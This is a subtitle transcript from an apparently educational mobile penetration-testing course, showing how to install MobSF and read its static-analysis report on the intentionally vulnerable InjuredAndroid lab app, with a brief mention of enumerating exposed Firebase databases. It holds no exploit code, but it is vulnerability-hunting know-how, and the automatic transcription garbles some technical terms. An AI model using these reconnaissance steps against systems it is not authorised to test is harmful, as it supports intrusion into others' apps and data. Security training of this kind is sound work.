00:06:58.330 --> 00:07:00.530
We can't just rely on this automated tool

162
00:07:00.530 --> 00:07:03.410
because we're still able to find that Firebase

163
00:07:03.410 --> 00:07:08.210
URL right here in the strings.xml. But

164
00:07:08.210 --> 00:07:10.090
either way, you would still definitely want to

165
00:07:10.090 --> 00:07:11.690
go out and try to look for these

166
00:07:11.690 --> 00:07:14.410
keywords using a tool like Cloud Enum or

167
00:07:14.410 --> 00:07:16.270
Firebase Enum as well.

168
00:07:16.590 --> 00:07:19.330
So that's our lesson on Firebase databases.

169
00:07:19.950 --> 00:07:21.890
I'll see you in the next video when

170
00:07:21.890 --> 00:07:24.610
we're starting to get into our dynamic analysis.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.680 --> 00:00:02.260
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now that we've gone ahead and actually

2
00:00:02.260 --> 00:00:04.420
solved some flags out of our injured Android

3
00:00:04.420 --> 00:00:07.840
application using the powers of static analysis, I

4
00:00:07.840 --> 00:00:10.260
want to introduce you to an automated tool

5
00:00:10.260 --> 00:00:11.540
called MobSF.

6
00:00:11.840 --> 00:00:13.800
This tool can be easily found on GitHub,

7
00:00:14.100 --> 00:00:16.240
I'll have the links in the notes below,

8
00:00:16.600 --> 00:00:18.400
so go ahead and refer to that if

9
00:00:18.400 --> 00:00:19.860
you want to find this GitHub repo.

10
00:00:20.580 --> 00:00:22.740
And the cool thing about MobSF is that

11
00:00:22.740 --> 00:00:24.860
this is pretty much like a little website

12
00:00:24.860 --> 00:00:26.800
that we're going to be running on our

13
00:00:26.800 --> 00:00:27.140
host.

14
00:00:27.580 --> 00:00:29.860
Here I'm doing this in my Kali Linux

15
00:00:29.860 --> 00:00:31.619
virtual machine just because it's going to be

16
00:00:31.619 --> 00:00:33.320
a little bit easier, but you can see

17
00:00:33.320 --> 00:00:35.380
here that you can just upload and analyse

18
00:00:35.380 --> 00:00:37.880
an APK file and it will actually give

19
00:00:37.880 --> 00:00:41.500
you some things here like some information about

20
00:00:41.500 --> 00:00:44.100
the application, it'll pull certain things out of

21
00:00:44.100 --> 00:00:46.380
the application, it's going to help you speed

22
00:00:46.380 --> 00:00:48.820
along your research process.

23
00:00:49.520 --> 00:00:52.200
Now just because we're using an automated tool

24
00:00:52.200 --> 00:00:54.500
like MobSF, it doesn't mean that we cannot

25
00:00:54.500 --> 00:00:56.200
use our brain anymore, right?

26
00:00:56.640 --> 00:00:59.800
So MobSF will assign your application a security

27
00:00:59.800 --> 00:01:02.220
score, and I don't want you to take

28
00:01:02.220 --> 00:01:04.400
that as like the be-all-end-all

29
00:01:04.400 --> 00:01:07.260
of the true security posture of your application.

30
00:01:08.100 --> 00:01:10.680
MobSF is just doing a static analysis, looking

31
00:01:10.680 --> 00:01:12.680
at the permissions and things like that, and

32
00:01:12.680 --> 00:01:15.340
assigning a score according to what it has

33
00:01:15.340 --> 00:01:15.720
found.

34
00:01:16.460 --> 00:01:18.440
In a lot of instances I've seen that

35
00:01:18.440 --> 00:01:20.880
applications have like a very low security score,

36
00:01:21.000 --> 00:01:23.000
sometimes they'll have like a very high security

37
00:01:23.000 --> 00:01:26.020
score, so whatever score you see in MobSF,

38
00:01:26.060 --> 00:01:28.780
if you're reporting this out to maybe an

39
00:01:28.780 --> 00:01:31.320
executive or, you know, someone you're writing your

40
00:01:31.320 --> 00:01:33.980
report to, make sure they understand a security

41
00:01:33.980 --> 00:01:37.400
score in MobSF does not necessarily mean that

42
00:01:37.400 --> 00:01:39.120
their application is secure, right?

43
00:01:39.380 --> 00:01:41.560
There's a lot more factors that go into

44
00:01:41.560 --> 00:01:43.840
it beyond just the static analysis.

45
00:01:44.880 --> 00:01:46.740
So getting into this tool, how we would

46
00:01:46.740 --> 00:01:49.000
copy this down off of GitHub, we can

47
00:01:49.000 --> 00:01:50.760
click the code link here and just copy

48
00:01:50.760 --> 00:01:53.460
the repo, and in my case I already

49
00:01:53.460 --> 00:01:57.560
have this tool installed, but if you wanted

50
00:01:57.560 --> 00:01:59.480
to get this tool you could just open

51
00:01:59.480 --> 00:02:01.700
a terminal, do a git clone, and then

52
00:02:01.700 --> 00:02:03.940
paste the URL into this command.

53
00:02:04.340 --> 00:02:06.320
Again, I already have this tool so I

54
00:02:06.320 --> 00:02:07.320
do not need to do this.

55
00:02:07.860 --> 00:02:09.740
So in my case I'm just going to

56
00:02:09.740 --> 00:02:13.640
cd into my MobSF directory, and next I'm

57
00:02:13.640 --> 00:02:15.440
going to do an ls, and here you

58
00:02:15.440 --> 00:02:17.140
can see all the files that will actually

59
00:02:17.140 --> 00:02:20.340
make MobSF run, and the ones that you're

60
00:02:20.340 --> 00:02:21.760
going to need if you're installing this on

61
00:02:21.760 --> 00:02:23.840
Windows, you're going to have to use this

62
00:02:23.840 --> 00:02:26.180
setup.bat and you're also going to have

63
00:02:26.180 --> 00:02:29.440
to use the requirements.txt. The first thing

64
00:02:29.440 --> 00:02:32.000
you need to do regardless of the operating

65
00:02:32.000 --> 00:02:34.660
system you're installing this on is run a

66
00:02:34.660 --> 00:02:41.240
pip3 instal-r and then requirements.txt. This

67
00:02:41.240 --> 00:02:43.120
is going to instal all the pip requirements

68
00:02:43.120 --> 00:02:43.700
you're going need.

69
00:02:43.760 --> 00:02:45.580
If I run this we'll see that I

70
00:02:45.580 --> 00:02:47.280
already have things installed so I'm going to

71
00:02:47.280 --> 00:02:49.620
cancel that, and next what you're going to

72
00:02:49.620 --> 00:02:52.480
do if you're on Windows you're going to

73
00:02:52.480 --> 00:02:54.860
run the setup.bat script, and if you're

74
00:02:54.860 --> 00:02:57.860
on Linux or Mac OS you're going to

75
00:02:57.860 --> 00:03:00.480
run the setup.sh script.

76
00:03:00.820 --> 00:03:02.360
So in my case I could just do

77
00:03:02.360 --> 00:03:07.260
a ./.setup.sh and run this from there.

78
00:03:07.400 --> 00:03:09.680
I already have everything installed again so I'm

79
00:03:09.680 --> 00:03:12.180
just going to cancel that, and once you've

80
00:03:12.180 --> 00:03:14.860
installed all the dependencies, by the way if

81
00:03:14.860 --> 00:03:16.640
there's other things that you're missing when you

82
00:03:16.640 --> 00:03:19.320
run this setup.sh script it will actually

83
00:03:19.320 --> 00:03:21.340
tell you how to instal each one of

84
00:03:21.340 --> 00:03:22.100
those individually.

85
00:03:22.380 --> 00:03:24.260
So maybe if you don't have like apk

86
00:03:24.260 --> 00:03:26.280
signer or you don't have like jar signer

87
00:03:26.280 --> 00:03:29.320
or other tools as well MobSF will actually

88
00:03:29.320 --> 00:03:31.440
tell you in the setup process exactly how

89
00:03:31.440 --> 00:03:33.280
to set up each one of those dependencies.

90
00:03:34.040 --> 00:03:36.260
So once you get all those dependencies installed,

91
00:03:36.420 --> 00:03:38.080
how you're going to run the tool is

92
00:03:38.080 --> 00:03:39.640
that you're going to do a ./. and

93
00:03:39.640 --> 00:03:41.620
now in my case since I'm on Linux

94
00:03:41.620 --> 00:03:43.680
I'm going to do run.sh. If I

95
00:03:43.680 --> 00:03:45.660
was running this on Windows I would run

96
00:03:45.660 --> 00:03:47.300
the run.bat file.

97
00:03:47.660 --> 00:03:49.780
I'm going to click enter here and now

98
00:03:49.780 --> 00:03:51.780
you will see that this is starting up

99
00:03:51.780 --> 00:03:55.220
and listening on port 8000 on my localhost,

100
00:03:55.240 --> 00:03:56.400
and this is how you can tell that

101
00:03:56.400 --> 00:03:58.040
MobSF is running properly.

102
00:03:58.040 --> 00:03:59.780
So now I can just go to a

103
00:03:59.780 --> 00:04:01.980
web browser and now I can just navigate

104
00:04:01.980 --> 00:04:07.750
to localhost port 8000, and here is the

105
00:04:07.750 --> 00:04:08.730
MobSF UI.

106
00:04:09.170 --> 00:04:11.050
You can see it's very very simple here.

107
00:04:11.410 --> 00:04:13.250
Something that's really nice for me as a

108
00:04:13.250 --> 00:04:15.649
penetration tester if I'm swinging back around to

109
00:04:15.649 --> 00:04:17.829
a previous app I assessed, you can go

110
00:04:17.829 --> 00:04:19.970
to this recent scans section here and you

111
00:04:19.970 --> 00:04:21.590
can see all the recent scans that you

112
00:04:21.590 --> 00:04:23.450
have, and something really nice that you can

113
00:04:23.450 --> 00:04:24.690
do in here is that you can actually

114
00:04:24.690 --> 00:04:27.150
compare previous versions of the application.

115
00:04:27.150 --> 00:04:29.130
So if you know the developer made some

116
00:04:29.130 --> 00:04:31.810
changes you can actually compare the previous version

117
00:04:31.810 --> 00:04:33.470
so you can see what has been fixed,

118
00:04:33.590 --> 00:04:35.470
what has been changed over time, so it's

119
00:04:35.470 --> 00:04:38.210
actually very useful there if you're looking at

120
00:04:38.210 --> 00:04:39.470
the recent scans section.

121
00:04:39.710 --> 00:04:41.950
You have your static analyser here which is

122
00:04:41.950 --> 00:04:43.770
where we'll upload our apk file.

123
00:04:44.030 --> 00:04:46.510
We also have our dynamic analyser here.

124
00:04:46.850 --> 00:04:48.510
In the dynamic analysis section I'm going to

125
00:04:48.510 --> 00:04:50.930
make a totally separate video that will show

126
00:04:50.930 --> 00:04:53.150
using this dynamic analysis section.

127
00:04:53.430 --> 00:04:55.770
You also have some API docs here so

128
00:04:55.770 --> 00:04:58.730
if you actually want to use MobSF as

129
00:04:58.730 --> 00:05:00.870
like a server so you can upload mobile

130
00:05:00.870 --> 00:05:03.230
apps maybe as part of a CICD pipeline

131
00:05:03.230 --> 00:05:05.470
you can actually do that in the API

132
00:05:05.470 --> 00:05:05.910
here.

133
00:05:06.350 --> 00:05:08.470
All the documentation for that is on their

134
00:05:08.470 --> 00:05:10.950
github repository as well so please take a

135
00:05:10.950 --> 00:05:12.770
look into that if you're interested in you

136
00:05:12.770 --> 00:05:15.070
know generating reports on a regular basis for

137
00:05:15.070 --> 00:05:17.790
your clients or maybe for your internal development

138
00:05:17.790 --> 00:05:18.210
teams.

139
00:05:18.850 --> 00:05:19.830
So I'm going to go to the static

140
00:05:19.830 --> 00:05:22.230
analyser here so I can highlight some of

141
00:05:22.230 --> 00:05:23.590
the static analysis features.

142
00:05:23.710 --> 00:05:26.350
I'm going to click upload and analyse and

143
00:05:26.350 --> 00:05:30.810
I'm going to now pull over my apk

144
00:05:30.810 --> 00:05:33.130
file from my local machine.

145
00:05:36.060 --> 00:05:38.220
So I'm pulling over the injured android application

146
00:05:38.220 --> 00:05:42.200
now just dragging and dropping it into I

147
00:05:42.200 --> 00:05:44.500
guess my pictures folder since I wasn't paying

148
00:05:44.500 --> 00:05:46.660
attention here but I can move that if

149
00:05:46.660 --> 00:05:47.200
I want to.

150
00:05:47.640 --> 00:05:49.700
But I'm going to click just click the

151
00:05:49.700 --> 00:05:51.840
apk here and upload it to MobSF.

152
00:05:52.820 --> 00:05:54.580
Now it's going to take a few minutes

153
00:05:54.580 --> 00:05:57.080
and actually analyse the application and that's going

154
00:05:57.080 --> 00:05:59.480
to pop back up on the screen with

155
00:05:59.480 --> 00:06:01.660
the UI and show us our security score

156
00:06:01.660 --> 00:06:02.740
and some more information.

157
00:06:05.580 --> 00:06:07.220
Okay so here we are with our static

158
00:06:07.220 --> 00:06:10.040
analysis results and you can see that MobSF

159
00:06:10.040 --> 00:06:11.620
makes this really easy to read.

160
00:06:11.800 --> 00:06:13.280
You can look over here for things like

161
00:06:13.280 --> 00:06:16.060
the target SDK and the main SDK like

162
00:06:16.060 --> 00:06:17.440
what we've been talking about that you can

163
00:06:17.440 --> 00:06:21.080
find in the androidmanifest.xml. Again the security

164
00:06:21.080 --> 00:06:22.800
score here it says that this app is

165
00:06:22.800 --> 00:06:25.380
a 75 out of 100 which is really

166
00:06:25.380 --> 00:06:29.140
ironic right because this is a purposely insecure

167
00:06:29.140 --> 00:06:32.480
application so definitely the security score that gets

168
00:06:32.480 --> 00:06:35.280
taken with a lot of grains of salt

169
00:06:35.280 --> 00:06:35.980
in this case.

170
00:06:36.600 --> 00:06:38.200
You can scroll down you can see like

171
00:06:38.200 --> 00:06:40.660
the basic Play Store information here, the title

172
00:06:40.660 --> 00:06:43.580
of the application, who developed the application, their

173
00:06:43.580 --> 00:06:45.680
website and their email address as well.

174
00:06:46.180 --> 00:06:48.840
You can see the entire description here that

175
00:06:48.840 --> 00:06:50.480
would be out on the Play Store if

176
00:06:50.480 --> 00:06:52.740
this application was actually pulled from the Play

177
00:06:52.740 --> 00:06:55.200
Store and scrolling down here we have a

178
00:06:55.200 --> 00:06:57.760
really nice summary of the application overall.

179
00:06:58.000 --> 00:06:59.500
So here you can see things like the

180
00:06:59.500 --> 00:07:02.360
activities of course of interest to us as

181
00:07:02.360 --> 00:07:04.380
penetration testers it's going to be all these

182
00:07:04.380 --> 00:07:06.400
exported activities that are right here.

183
00:07:06.840 --> 00:07:08.280
If we wanted to go and look at

184
00:07:08.280 --> 00:07:09.900
all the activities that were found we can

185
00:07:09.900 --> 00:07:11.620
just click that view button and it will

186
00:07:11.620 --> 00:07:14.020
bring us right down to this activity section.

187
00:07:14.240 --> 00:07:16.840
You can use this left hand navigation bar

188
00:07:16.840 --> 00:07:19.500
here to jump through different parts of the

189
00:07:19.500 --> 00:07:20.760
application information.

190
00:07:21.620 --> 00:07:23.260
Again we can do the same thing with

191
00:07:23.260 --> 00:07:26.540
the services, receivers, exported receivers and things like

192
00:07:26.540 --> 00:07:26.860
that.

193
00:07:27.500 --> 00:07:30.040
We can also hop into our dynamic analysis

194
00:07:30.040 --> 00:07:33.600
process here which I'll show in the dynamic

195
00:07:33.600 --> 00:07:35.580
analysis section on my Windows machine.

196
00:07:36.020 --> 00:07:37.600
You can also take a look at things

197
00:07:37.600 --> 00:07:40.820
like the androidmanifest.xml it'll pop it up

198
00:07:40.820 --> 00:07:43.040
into an xml file that's pretty easy to

199
00:07:43.040 --> 00:07:45.820
read here so that's a nice and convenient

200
00:07:45.820 --> 00:07:48.260
feature that allows you to read the manifest

201
00:07:48.260 --> 00:07:51.060
right away and also they have a source

202
00:07:51.060 --> 00:07:54.180
tree a source code tree viewer so you

203
00:07:54.180 --> 00:07:56.280
can click view source here you can actually

204
00:07:56.280 --> 00:07:58.680
go through the entire source code of the

205
00:07:58.680 --> 00:08:00.900
application kind of similar to what we're doing

206
00:08:00.900 --> 00:08:03.960
in so this is a nice alternative as

207
00:08:03.960 --> 00:08:05.860
well if you don't want to use jadex

208
00:08:05.860 --> 00:08:09.920
but I prefer using jadex but you can

209
00:08:09.920 --> 00:08:11.340
also use this if you wanted to as

210
00:08:11.340 --> 00:08:12.800
well because it does make it pretty easy

211
00:08:12.800 --> 00:08:15.800
to read all the different types of code

212
00:08:15.800 --> 00:08:16.860
that are in the application.

213
00:08:17.220 --> 00:08:19.280
You can also do things like search here

214
00:08:19.280 --> 00:08:20.720
right so if you're looking for a particular

215
00:08:20.720 --> 00:08:23.060
file name or you're looking for a particular

216
00:08:23.060 --> 00:08:25.540
string you can actually search by those as

217
00:08:25.540 --> 00:08:25.800
well.

218
00:08:26.720 --> 00:08:33.429
Going back here to our main screen you

219
00:08:33.429 --> 00:08:34.950
can view the smalle file if you want

220
00:08:34.950 --> 00:08:36.610
to do that and you can also download

221
00:08:36.610 --> 00:08:39.929
the smalle code the apk itself and the

222
00:08:39.929 --> 00:08:41.770
java code as well if you want to

223
00:08:41.770 --> 00:08:43.370
take a look through that individually.

224
00:08:44.250 --> 00:08:45.930
You can see here this failed to read

225
00:08:45.930 --> 00:08:48.190
the code signing certificate that's a unique error

226
00:08:48.190 --> 00:08:50.330
I don't usually see that very often if

227
00:08:50.330 --> 00:08:52.530
you're pulling an application off the google play

228
00:08:52.530 --> 00:08:54.270
store you will really never see that happen.

229
00:08:54.970 --> 00:08:57.150
Gives you a quick overview of the application

230
00:08:57.150 --> 00:08:59.690
permissions here and again this is something that

231
00:08:59.690 --> 00:09:01.010
needs to be taken with a little bit

232
00:09:01.010 --> 00:09:02.950
of a grain of salt right so for

233
00:09:02.950 --> 00:09:06.110
example here mob sf is marking reading external

234
00:09:06.110 --> 00:09:09.830
storage and writing external storage as possibly dangerous

235
00:09:09.830 --> 00:09:13.770
permissions right but that's not necessarily true so

236
00:09:13.770 --> 00:09:16.670
if our application is you know reading something

237
00:09:16.670 --> 00:09:18.530
from an sd card it might not be

238
00:09:18.530 --> 00:09:20.270
a bad thing if it's not reading something

239
00:09:20.270 --> 00:09:22.930
sensitive or it's not writing sensitive data right

240
00:09:22.930 --> 00:09:25.350
so just marking it as dangerous here this

241
00:09:25.350 --> 00:09:27.470
is what kind of affects the security score

242
00:09:27.470 --> 00:09:30.290
overall the more activities with a dangerous status

243
00:09:30.290 --> 00:09:32.430
the lower that security score is going to

244
00:09:32.430 --> 00:09:34.290
be but again from the mind of a

245
00:09:34.290 --> 00:09:36.730
pen tester this can be either a good

246
00:09:36.730 --> 00:09:38.690
thing or a bad thing or even a

247
00:09:38.690 --> 00:09:41.430
neutral thing in some situations right it all

248
00:09:41.430 --> 00:09:43.830
depends on how these permissions are actually being

249
00:09:43.830 --> 00:09:45.470
used by the application.

250
00:09:46.230 --> 00:09:47.370
I'm going to scroll down a bit more

251
00:09:47.370 --> 00:09:49.250
this gives you a quick summary of the

252
00:09:49.250 --> 00:09:51.330
different apis that are used in the application

253
00:09:51.330 --> 00:09:52.630
you can see that we have like some

254
00:09:52.630 --> 00:09:57.650
base64 decoding some base64 encoding some crypto usage

255
00:09:57.650 --> 00:09:59.770
and you can actually click this source code

256
00:09:59.770 --> 00:10:01.630
right if you wanted to go in and

257
00:10:01.630 --> 00:10:04.050
look at the source code directly and you

258
00:10:04.050 --> 00:10:06.070
know you can look through whatever source code

259
00:10:06.070 --> 00:10:08.010
you want to that might be related to

260
00:10:08.010 --> 00:10:10.810
that application so for example here like if

261
00:10:10.810 --> 00:10:12.570
i was pen testing this application and i

262
00:10:12.570 --> 00:10:15.830
saw an http connection as opposed to https

263
00:10:15.830 --> 00:10:17.730
that would be something i'd be interested in

264
00:10:17.730 --> 00:10:19.550
and i can actually click in there and

265
00:10:19.550 --> 00:10:21.730
see maybe if like a url is populated

266
00:10:21.730 --> 00:10:24.130
in here so i know that the connection

267
00:10:24.130 --> 00:10:28.570
is made over an insecure protocol going back

268
00:10:28.570 --> 00:10:30.490
here you can see that there's also kind

269
00:10:30.490 --> 00:10:32.890
of like a pagination here so there's actually

270
00:10:32.890 --> 00:10:36.670
three pages of results so of the apis

271
00:10:36.670 --> 00:10:39.230
there so you can actually paginate through these

272
00:10:39.230 --> 00:10:42.510
different things so if you think you should

273
00:10:42.510 --> 00:10:44.210
have pulled back more stuff from the application

274
00:10:44.210 --> 00:10:45.830
you might need to look through the additional

275
00:10:45.830 --> 00:10:49.230
pages going down here to the browsable activities

276
00:10:49.230 --> 00:10:52.290
this would be something of interest to us

277
00:10:52.290 --> 00:10:54.990
you can see here we have some csp

278
00:10:54.990 --> 00:10:58.670
bypass activity with http and https so it

279
00:10:58.670 --> 00:11:00.690
might be reaching out to a website or

280
00:11:00.690 --> 00:11:02.570
whatever you can see here that there's a

281
00:11:02.570 --> 00:11:04.530
deep link activity we're not going to go

282
00:11:04.530 --> 00:11:06.550
into deep links in this course right now

283
00:11:06.550 --> 00:11:09.230
i'll probably be adding videos later but this

284
00:11:09.230 --> 00:11:10.790
could be of interest to you if looking

285
00:11:10.790 --> 00:11:14.750
for deep links network security here this is

286
00:11:14.750 --> 00:11:18.570
usually something important if they're not implementing ssl

287
00:11:18.570 --> 00:11:21.250
pinning or in this case using a base

288
00:11:21.250 --> 00:11:23.870
configuration that is allowing clear text traffic to

289
00:11:23.870 --> 00:11:26.810
all domains remember whenever possible we want to

290
00:11:26.810 --> 00:11:31.810
be using ssl https for our applications right

291
00:11:31.810 --> 00:11:33.090
so we can prevent man-in-the-middle

292
00:11:33.090 --> 00:11:34.650
attacks so this would be kind of a

293
00:11:34.650 --> 00:11:37.170
finding for you if you were looking through

294
00:11:37.170 --> 00:11:39.810
a application on the play store for example

295
00:11:39.810 --> 00:11:42.270
you want to try to have encrypted traffic

296
00:11:42.270 --> 00:11:45.290
no matter what going down here it does

297
00:11:45.290 --> 00:11:47.250
do a little bit of a manifest analysis

298
00:11:47.250 --> 00:11:49.510
here it can point out certain things to

299
00:11:49.510 --> 00:11:51.190
you that you could find in the android

300
00:11:51.190 --> 00:11:54.410
manifest for example here the android allow backup

301
00:11:54.410 --> 00:11:57.150
flag is missing it's a best practise to

302
00:11:57.150 --> 00:11:59.570
have this flag be set to true to

303
00:11:59.570 --> 00:12:03.630
false in most applications if you allow the

304
00:12:03.630 --> 00:12:06.310
allow backup flag to be set to true

305
00:12:06.310 --> 00:12:08.610
that could allow an attacker to actually backup

306
00:12:08.610 --> 00:12:11.370
data from the application and save it locally

307
00:12:11.370 --> 00:12:13.070
on the device so it's a best practise

308
00:12:13.070 --> 00:12:16.130
to have this android allow backup should be

309
00:12:16.130 --> 00:12:18.110
set to false so that'd be a kind

310
00:12:18.110 --> 00:12:19.890
of like a best practise or an informational

311
00:12:19.890 --> 00:12:23.310
finding for a mobile application going down a

312
00:12:23.310 --> 00:12:24.850
little bit you can see that we actually

313
00:12:24.850 --> 00:12:28.330
have some activities that are exported like for

314
00:12:28.330 --> 00:12:31.230
example this b25l activity this is where we

315
00:12:31.230 --> 00:12:32.850
actually got one of the flags from the

316
00:12:32.850 --> 00:12:35.450
application right and it also points out these

317
00:12:35.450 --> 00:12:37.670
other ones that are exported equals true as

318
00:12:37.670 --> 00:12:40.070
well so those are all the activities you

319
00:12:40.070 --> 00:12:43.810
could trigger from outside of the application you

320
00:12:43.810 --> 00:12:46.170
can see there's more pages there this activity

321
00:12:46.170 --> 00:12:48.430
and now the manifest analysis is usually very

322
00:12:48.430 --> 00:12:50.270
helpful for me just to get like a

323
00:12:50.270 --> 00:12:53.550
quick sense of the application overall going down

324
00:12:53.550 --> 00:12:56.290
here there's a code analysis section and what's

325
00:12:56.290 --> 00:12:58.350
nice about this is it will you know

326
00:12:58.350 --> 00:13:00.810
tell you some possible issues so like here

327
00:13:00.810 --> 00:13:03.630
sensitive information is being logged maybe it's being

328
00:13:03.630 --> 00:13:06.130
logged to logcat maybe it's being logged to

329
00:13:06.130 --> 00:13:07.650
some file so you might want to look

330
00:13:07.650 --> 00:13:09.690
through some of these classes if you're doing

331
00:13:09.690 --> 00:13:12.890
a bug bounty hunt against an application scrolling

332
00:13:12.890 --> 00:13:16.090
down a bit more weak encryption algorithm used

333
00:13:16.090 --> 00:13:18.630
i mean it scores this as a high

334
00:13:18.630 --> 00:13:22.030
depends on the situation obviously also points out

335
00:13:22.030 --> 00:13:24.290
things like the app copying data to and

336
00:13:24.290 --> 00:13:26.950
from the clipboard depending on your use case

337
00:13:26.950 --> 00:13:28.790
that can be a good thing or a

338
00:13:28.790 --> 00:13:30.750
bad thing for example a lot of banking

339
00:13:30.750 --> 00:13:35.250
applications or really sensitive applications should not really

340
00:13:35.250 --> 00:13:37.230
be allowing you to copy and paste from

341
00:13:37.230 --> 00:13:39.250
the clipboard and also you can think of

342
00:13:39.250 --> 00:13:42.030
that from like a work profile perspective right

343
00:13:42.030 --> 00:13:44.950
you might want to stop users from copying

344
00:13:44.950 --> 00:13:48.390
information from the clipboard from certain applications right

345
00:13:48.390 --> 00:13:50.410
and here this would be a big one

346
00:13:50.410 --> 00:13:52.090
if i was doing a bug bounty hunt

347
00:13:52.650 --> 00:13:55.670
using a sqlite database and executing raw sql

348
00:13:55.670 --> 00:13:57.910
query this would be a big indicator that

349
00:13:57.910 --> 00:14:00.410
possibly i could get a sql injection attack

350
00:14:00.410 --> 00:14:03.030
on this application so i'd probably want to

351
00:14:03.030 --> 00:14:04.850
go through and look through the actual source

352
00:14:04.850 --> 00:14:08.150
code there going down a bit more there's

353
00:14:08.150 --> 00:14:11.830
a shared library binary analysis this is something

354
00:14:11.830 --> 00:14:14.790
you can read up more on nx and

355
00:14:14.790 --> 00:14:19.450
stack canary railroad are things used to help

356
00:14:19.450 --> 00:14:22.210
prevent buffer overflow attacks so depending on how

357
00:14:22.210 --> 00:14:25.390
the application is coded you could possibly find

358
00:14:25.390 --> 00:14:27.710
things like buffer overflow attacks if they're not

359
00:14:27.710 --> 00:14:30.750
protecting this properly i'm not going to go

360
00:14:30.750 --> 00:14:32.310
into the details of all that it's kind

361
00:14:32.310 --> 00:14:36.840
of outside the of this class keep going

362
00:14:36.840 --> 00:14:39.860
down here and we have the niap analysis

363
00:14:39.860 --> 00:14:42.740
here as well tonnes of different stuff in

364
00:14:42.740 --> 00:14:47.080
here not necessarily super familiar with this but

365
00:14:47.080 --> 00:14:49.080
it is kind of useful if it does

366
00:14:49.080 --> 00:14:50.620
find something you might want to take a

367
00:14:50.620 --> 00:14:53.660
look you can see has some different findings

368
00:14:53.660 --> 00:14:56.060
here i keep on going down here file

369
00:14:56.060 --> 00:14:58.440
analysis this can sometimes be helpful if you're

370
00:14:58.440 --> 00:15:00.500
looking at an application from the play store

371
00:15:00.500 --> 00:15:02.940
if it found any files that are stored

372
00:15:02.940 --> 00:15:05.740
by the application by default may be created

373
00:15:05.740 --> 00:15:08.480
by the application on installation right so this

374
00:15:08.480 --> 00:15:11.120
can be actually something useful for you ap

375
00:15:11.120 --> 00:15:13.600
kid analysis this is where we might find

376
00:15:13.600 --> 00:15:16.720
some things related to an application protecting itself

377
00:15:16.720 --> 00:15:19.140
so for example if you're using some banking

378
00:15:19.140 --> 00:15:22.020
applications or other things like that some of

379
00:15:22.020 --> 00:15:26.300
them have protection mechanisms involved and this analysis

380
00:15:26.300 --> 00:15:28.760
section can actually highlight some of those things

381
00:15:28.760 --> 00:15:32.360
that might be found uh quark analysis here

382
00:15:32.360 --> 00:15:35.400
there was no potential malicious behaviour discovered this

383
00:15:35.400 --> 00:15:37.460
could be useful if you're trying to discover

384
00:15:37.460 --> 00:15:39.820
you know if an app is actually malicious

385
00:15:39.820 --> 00:15:42.220
maybe sending data to places where it shouldn't

386
00:15:42.220 --> 00:15:45.240
here is something that is very useful for

387
00:15:45.240 --> 00:15:47.240
me as well as a bug bounty hunter

388
00:15:47.240 --> 00:15:50.260
server locations you can see that kind of

389
00:15:50.260 --> 00:15:53.420
highlights on the map here where different application

390
00:15:53.420 --> 00:15:55.560
traffic might be going to could give you

391
00:15:55.560 --> 00:15:58.020
some information about the data centres or cloud

392
00:15:58.020 --> 00:16:01.940
providers being used by the application developer going

393
00:16:01.940 --> 00:16:05.240
down a bit more domain malware check is

394
00:16:05.240 --> 00:16:07.000
here and this is really nice if you're

395
00:16:07.000 --> 00:16:09.040
trying to find out if the application has

396
00:16:09.040 --> 00:16:13.960
any malicious urls or any other malicious areas

397
00:16:13.960 --> 00:16:15.700
that might be reaching out to you can

398
00:16:15.700 --> 00:16:17.560
see that everything here checked out as good

399
00:16:17.560 --> 00:16:21.240
but this pretty much runs these urls against

400
00:16:21.240 --> 00:16:23.480
virus total as far as i'm as far

401
00:16:23.480 --> 00:16:25.600
as i know and uh you know checks

402
00:16:25.600 --> 00:16:27.800
it to see if this url is actually

403
00:16:27.800 --> 00:16:30.360
a good thing or a bad thing similarly

404
00:16:30.360 --> 00:16:33.400
here the urls this is actually brought out

405
00:16:33.400 --> 00:16:36.060
in the static analysis so it will look

406
00:16:36.060 --> 00:16:38.300
for anything with like an http a colon

407
00:16:38.300 --> 00:16:40.620
slash slash you can also see like it

408
00:16:40.620 --> 00:16:42.800
kind of has some false positives here with

409
00:16:42.800 --> 00:16:46.040
a data application slash json because there's like

410
00:16:46.040 --> 00:16:48.800
a colon and a slash here does have

411
00:16:48.800 --> 00:16:51.820
some false positives but this is a quick

412
00:16:51.820 --> 00:16:53.760
way to get an overview of all the

413
00:16:53.760 --> 00:16:55.720
urls that might be in the application you

414
00:16:55.720 --> 00:16:57.480
can see like we have the schemas.android

415
00:16:57.480 --> 00:17:00.740
.com we have the injured android firebase database

416
00:17:00.740 --> 00:17:04.240
here and some github flutter stuff so this

417
00:17:04.240 --> 00:17:06.140
can give you a quick overview of some

418
00:17:06.140 --> 00:17:07.599
of the urls that might be used by

419
00:17:07.599 --> 00:17:09.800
the application just keep in mind that there's

420
00:17:09.800 --> 00:17:11.760
usually a lot of false positives in here

421
00:17:11.760 --> 00:17:14.359
like the data colon application slash dart that

422
00:17:14.359 --> 00:17:16.859
we have in here going down a bit

423
00:17:16.859 --> 00:17:19.060
more it did pull out the firebase database

424
00:17:19.060 --> 00:17:20.200
so that would be something that you want

425
00:17:20.200 --> 00:17:22.619
to check and here it also even pulls

426
00:17:22.619 --> 00:17:24.520
out things like email addresses so you can

427
00:17:24.520 --> 00:17:27.040
see that we have like the bnaxsec.gmail

428
00:17:27.040 --> 00:17:29.180
.com and a couple of other ones as

429
00:17:29.180 --> 00:17:33.460
well then these u0013s are kind of false

430
00:17:33.460 --> 00:17:35.500
positives this would be the user id that

431
00:17:35.500 --> 00:17:37.460
it might be installing as on the phone

432
00:17:38.400 --> 00:17:41.080
trackers here there's no trackers in the injured

433
00:17:41.080 --> 00:17:43.920
android application but this is actually very useful

434
00:17:43.920 --> 00:17:46.060
for us as pen testers and also if

435
00:17:46.060 --> 00:17:48.560
you're looking for things like malware this can

436
00:17:48.560 --> 00:17:50.800
highlight all the common trackers that are found

437
00:17:50.800 --> 00:17:53.120
in the application if you're worried about things

438
00:17:53.120 --> 00:17:55.720
like your user privacy down here in the

439
00:17:55.720 --> 00:17:57.960
string section it tries to pull out all

440
00:17:57.960 --> 00:18:00.100
the tonnes of strings are found in this

441
00:18:00.100 --> 00:18:03.820
application you can look through that manually if

442
00:18:03.820 --> 00:18:05.660
you want to in this case it's have

443
00:18:05.660 --> 00:18:09.800
a tonne of strings but there is a

444
00:18:09.800 --> 00:18:14.040
next set here under strings on the left

445
00:18:14.040 --> 00:18:15.920
